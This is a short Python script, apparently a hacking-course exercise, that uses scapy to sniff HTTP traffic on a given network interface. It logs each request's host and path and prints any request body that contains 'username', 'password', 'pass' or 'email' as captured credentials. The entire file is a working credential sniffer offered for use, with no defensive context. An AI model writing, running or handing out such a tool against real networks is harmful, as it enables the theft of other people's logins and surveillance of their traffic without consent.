#!/usr/bin/env python
import argparse
from scapy.all import sniff
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff_packets(iface):
    # Using sniff function from scapy to capture packets
    sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Extracting Host and Path from HTTPRequest layer
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        print("[+] HTTP Request >> Host: {} Path: {}".format(host, path))
        
        if packet.haslayer(http.Raw):
            # Extracting payload from Raw layer
            load = packet[http.Raw].load.decode()
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    # If a potential username or password is found, print it
                    print("\n[+] Possible username/password found >> {}\n".format(load))
                    break

# Get the interface from command-line arguments
iface = get_interface()

# Start sniffing packets on the specified interface
if iface:
    sniff_packets(iface)
else:
    print("Please specify an interface using -i or --interface option.")
